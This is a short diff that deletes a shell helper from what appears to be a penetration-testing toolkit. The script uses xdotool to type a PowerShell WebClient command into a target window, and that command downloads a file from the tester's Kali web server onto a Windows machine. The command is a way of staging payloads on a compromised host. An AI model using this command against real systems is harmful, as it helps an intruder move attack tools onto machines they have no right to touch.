@@ -1,7 +1,0 @@
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip
-
-B_PATH=$(zenity --entry --title="Path" --text="Enter path from webroot:")
-F_NAME=$(basename $B_PATH)
-
-xdotool type --delay 10 "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}/${B_PATH}', '${F_NAME}')\""
-xdotool key Return
